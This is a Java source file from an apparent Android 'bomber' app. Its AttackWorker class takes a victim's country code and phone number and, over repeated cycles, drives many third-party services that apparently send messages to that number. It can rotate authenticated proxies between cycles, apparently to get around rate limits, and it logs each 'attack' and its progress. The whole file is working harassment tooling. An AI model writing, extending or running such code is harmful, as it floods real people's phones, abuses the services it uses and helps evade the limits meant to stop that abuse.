package com.dm.bomber.workers;

import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.dm.bomber.services.Service;
import com.dm.bomber.services.Services;
import com.dm.bomber.ui.MainRepository;

import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class AttackWorker extends Worker {

    private static final String TAG = "Attack";

    public static final String KEY_COUNTRY_CODE = "country_code";
    public static final String KEY_PHONE = "phone";
    public static final String KEY_NUMBER_OF_CYCLES = "number_of_cycles";
    public static final String KEY_PROXY_ENABLED = "proxy_enabled";

    public static final String KEY_PROGRESS = "progress";
    public static final String KEY_MAX_PROGRESS = "max_progress";

    private int progress = 0;

    private CountDownLatch tasks;

    private static OkHttpClient client = new OkHttpClient.Builder()
            .callTimeout(7, TimeUnit.SECONDS)
            .addInterceptor(chain -> {
                Request request = chain.request();
                Log.v(TAG, String.format("Sending request %s", request.url()));

                Response response = chain.proceed(request);
                Log.v(TAG, String.format("Received response for %s with status code %s",
                        response.request().url(), response.code()));

                return response;
            }).build();

    public AttackWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);

        setProgressAsync(new Data.Builder()
                .putInt(KEY_PROGRESS, 0)
                .putInt(KEY_MAX_PROGRESS, 0)
                .build());
    }

    @NonNull
    @Override
    public Result doWork() {
        List<AuthProxy> proxies = getInputData().getBoolean(KEY_PROXY_ENABLED, false) ?
                new MainRepository(getApplicationContext()).getProxy() : new ArrayList<>();

        String countryCode = getInputData().getString(KEY_COUNTRY_CODE);
        String phone = getInputData().getString(KEY_PHONE);

        int numberOfCycles = getInputData().getInt(KEY_NUMBER_OF_CYCLES, 1);

        List<Service> usableServices = Services.getUsableServices(countryCode);
        Log.i(TAG, String.format("Starting attack on +%s%s", countryCode, phone));

        client = client.newBuilder()
                .proxy(null)
                .build();

        for (int cycle = 0; cycle < numberOfCycles; cycle++) {
            Log.i(TAG, String.format("Started cycle %s", cycle));
            tasks = new CountDownLatch(usableServices.size());

            if (!proxies.isEmpty()) {
                AuthProxy authProxy = proxies.get(cycle % proxies.size());

                client = client.newBuilder()
                        .proxy(authProxy)
                        .proxyAuthenticator(authProxy)
                        .build();
            }

            for (Service service : usableServices) {
                service.prepare(countryCode, phone);

                try {
                    service.run(client, new com.dm.bomber.services.Callback() {
                        @Override
                        public void onError(Exception e) {
                            Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
                            tasks.countDown();
                        }

                        @Override
                        public void onResponse(@NotNull Call call, @NotNull Response response) {
                            if (!response.isSuccessful()) {
                                Log.i(TAG, String.format("%s returned an error HTTP code: %s",
                                        service.getClass().getName(), response.code()));
                            }

                            tasks.countDown();
                            setProgressAsync(new Data.Builder()
                                    .putInt(KEY_PROGRESS, progress++)
                                    .putInt(KEY_MAX_PROGRESS, usableServices.size() * numberOfCycles)
                                    .build());
                        }
                    });
                } catch (StringIndexOutOfBoundsException e) {
                    Log.w(TAG, String.format("%s could not process the number", service.getClass().getName()));
                }
            }

            if (isStopped())
                break;

            try {
                tasks.await();
            } catch (InterruptedException e) {
                break;
            }
        }

        Log.i(TAG, String.format("Attack on +%s%s ended", countryCode, phone));
        return Result.success();
    }
}
